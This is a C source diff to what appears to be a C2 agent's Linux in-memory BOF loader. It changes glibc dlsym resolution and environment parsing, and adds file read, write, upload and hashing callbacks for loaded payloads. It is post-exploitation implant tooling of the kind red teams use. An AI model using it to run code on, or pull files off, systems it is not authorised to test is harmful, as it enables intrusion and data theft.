@@ -179,7 +179,9 @@ void BeaconFormatInt(formatp *format, int value) {
   format->buffer += 4;
 }
 
-int BeaconIsAdmin(void) { return geteuid() == 0; }
+int BeaconIsAdmin(void) {
+  return geteuid() == 0;
+}
 
 void BeaconDataParse(datap *parser, char *buffer, int size) {
   if (parser == NULL)
@@ -251,21 +253,44 @@ char *BeaconDataExtract(datap *parser, int *size) {
 }
 
 #if defined(__GLIBC__)
-/* glibc's internal dlsym() accepts RTLD_DEFAULT (NULL) and searches the global
- * scope, so the loader neither opens libc nor links libdl. */
+/* glibc's internal dlsym() needs a module handle. Earlier glibc versions crash
+ * on a NULL handle, so open libc by soname first; newer versions keep the same
+ * internal entry points as local symbols. */
 extern void *__libc_dlsym(void *handle, const char *name);
-#define C2_DLSYM(name) __libc_dlsym(NULL, name)
+extern void *__libc_dlopen_mode(const char *name, int mode);
+extern int __libc_dlclose(void *handle);
+#define C2_DLSYM(handle, name) __libc_dlsym((handle), (name))
 #else
-#define C2_DLSYM(name) dlsym(RTLD_DEFAULT, name)
+#include <dlfcn.h>
+#define C2_DLSYM(handle, name) dlsym((handle), (name))
 #endif
 
-void *beacon_host_dlsym(const char *name) { return C2_DLSYM(name); }
+static void *libc_handle;
+
+void *beacon_host_dlsym(const char *name) {
+#if defined(__GLIBC__)
+  if (libc_handle == NULL)
+    libc_handle = __libc_dlopen_mode("libc.so.6", 1 /* RTLD_LAZY */);
+  if (libc_handle != NULL)
+    return C2_DLSYM(libc_handle, name);
+#endif
+  return C2_DLSYM(NULL, name);
+}
+
+void beacon_host_dlsym_reset(void) {
+#if defined(__GLIBC__)
+  if (libc_handle != NULL) {
+    (void)__libc_dlclose(libc_handle);
+    libc_handle = NULL;
+  }
+#endif
+}
 
 /* getEnviron must return a live char **. Resolving the environ data symbol
- * through __libc_dlsym(NULL, ...) works for functions on some hosts but not
- * for data, and a direct environ import needs a data relocation the C agent's
- * in-memory loader does not apply. Read /proc/self/environ once instead and
- * keep the parsed array for the lifetime of the mapped loader. */
+ * through dlsym works for functions on some hosts but not for data, and a
+ * direct environ import needs a data relocation the C agent's in-memory loader
+ * does not apply. Read /proc/self/environ once instead and keep the parsed
+ * array for the lifetime of the mapped loader. */
 static char **env_cache;
 static char *env_cache_buf;
 
@@ -357,29 +382,110 @@ void beacon_env_reset(void) {
   env_cache = NULL;
   env_cache_buf = NULL;
 }
-static const char *get_os_name(void) { return "lin"; }
+static const char *get_os_name(void) {
+  return "lin";
+}
+
+/* ------------------------------------------------------------------------- */
+/* Optional host primitives for file-transfer BOFs                            */
+/* ------------------------------------------------------------------------- */
+
+typedef int (*host_read_fn)(void *ctx, const char *path, unsigned char **out,
+                            unsigned long *len, char *err, int err_cap);
+typedef int (*host_write_fn)(void *ctx, const char *path,
+                             const unsigned char *data, unsigned long len,
+                             char *err, int err_cap);
+typedef int (*host_upload_fn)(void *ctx, const char *token, const char *path,
+                              unsigned long offset, char *err, int err_cap);
+typedef int (*host_sha256_fn)(void *ctx, const unsigned char *data,
+                              unsigned long len, char *hex,
+                              unsigned long hex_cap, char *err, int err_cap);
+
+static void *host_ctx;
+static host_read_fn host_read;
+static host_write_fn host_write;
+static host_upload_fn host_upload;
+static host_sha256_fn host_sha256;
+
+static void set_host_err(char *err, int err_cap, const char *msg) {
+  if (err == NULL || err_cap <= 0)
+    return;
+  snprintf(err, (size_t)err_cap, "%s", msg != NULL ? msg : "unavailable");
+}
+
+__attribute__((visibility("default"))) void
+SetHostBridge(void *ctx, host_read_fn read, host_write_fn write,
+              host_upload_fn upload, host_sha256_fn sha256) {
+  host_ctx = ctx;
+  host_read = read;
+  host_write = write;
+  host_upload = upload;
+  host_sha256 = sha256;
+}
+
+int ReadFile(const char *path, unsigned char **out, unsigned long *len,
+             char *err, int err_cap) {
+  if (host_read == NULL) {
+    set_host_err(err, err_cap, "ReadFile unavailable");
+    return -9;
+  }
+  return host_read(host_ctx, path, out, len, err, err_cap);
+}
+
+int WriteFile(const char *path, const unsigned char *data, unsigned long len,
+              char *err, int err_cap) {
+  if (host_write == NULL) {
+    set_host_err(err, err_cap, "WriteFile unavailable");
+    return -9;
+  }
+  return host_write(host_ctx, path, data, len, err, err_cap);
+}
+
+int UploadFile(const char *token, const char *path, unsigned long offset,
+               char *err, int err_cap) {
+  if (host_upload == NULL) {
+    set_host_err(err, err_cap, "UploadFile unavailable");
+    return -9;
+  }
+  return host_upload(host_ctx, token, path, offset, err, err_cap);
+}
+
+int Sha256Hex(const unsigned char *data, unsigned long len, char *hex,
+              unsigned long hex_cap, char *err, int err_cap) {
+  if (host_sha256 == NULL) {
+    set_host_err(err, err_cap, "Sha256Hex unavailable");
+    return -9;
+  }
+  return host_sha256(host_ctx, data, len, hex, hex_cap, err, err_cap);
+}
 
 static const struct {
   const char *name;
   void *fn;
-} beacon_apis[] = { { "BeaconPrintf", (void *)BeaconPrintf },
-                    { "BeaconOutput", (void *)BeaconOutput },
-                    { "BeaconDataParse", (void *)BeaconDataParse },
-                    { "BeaconDataInt", (void *)BeaconDataInt },
-                    { "BeaconDataShort", (void *)BeaconDataShort },
-                    { "BeaconDataLength", (void *)BeaconDataLength },
-                    { "BeaconDataExtract", (void *)BeaconDataExtract },
-                    { "BeaconFormatAlloc", (void *)BeaconFormatAlloc },
-                    { "BeaconFormatReset", (void *)BeaconFormatReset },
-                    { "BeaconFormatFree", (void *)BeaconFormatFree },
-                    { "BeaconFormatAppend", (void *)BeaconFormatAppend },
-                    { "BeaconFormatPrintf", (void *)BeaconFormatPrintf },
-                    { "BeaconFormatToString", (void *)BeaconFormatToString },
-                    { "BeaconFormatInt", (void *)BeaconFormatInt },
-                    { "BeaconIsAdmin", (void *)BeaconIsAdmin },
-                    { "swap_endianess", (void *)swap_endianess },
-                    { "getEnviron", (void *)get_environ },
-                    { "getOSName", (void *)get_os_name }, };
+} beacon_apis[] = {
+    {"BeaconPrintf", (void *)BeaconPrintf},
+    {"BeaconOutput", (void *)BeaconOutput},
+    {"BeaconDataParse", (void *)BeaconDataParse},
+    {"BeaconDataInt", (void *)BeaconDataInt},
+    {"BeaconDataShort", (void *)BeaconDataShort},
+    {"BeaconDataLength", (void *)BeaconDataLength},
+    {"BeaconDataExtract", (void *)BeaconDataExtract},
+    {"BeaconFormatAlloc", (void *)BeaconFormatAlloc},
+    {"BeaconFormatReset", (void *)BeaconFormatReset},
+    {"BeaconFormatFree", (void *)BeaconFormatFree},
+    {"BeaconFormatAppend", (void *)BeaconFormatAppend},
+    {"BeaconFormatPrintf", (void *)BeaconFormatPrintf},
+    {"BeaconFormatToString", (void *)BeaconFormatToString},
+    {"BeaconFormatInt", (void *)BeaconFormatInt},
+    {"BeaconIsAdmin", (void *)BeaconIsAdmin},
+    {"swap_endianess", (void *)swap_endianess},
+    {"getEnviron", (void *)get_environ},
+    {"getOSName", (void *)get_os_name},
+    {"ReadFile", (void *)ReadFile},
+    {"WriteFile", (void *)WriteFile},
+    {"UploadFile", (void *)UploadFile},
+    {"Sha256Hex", (void *)Sha256Hex},
+};
 
 void *beacon_api_lookup(const char *name) {
   if (name == NULL)
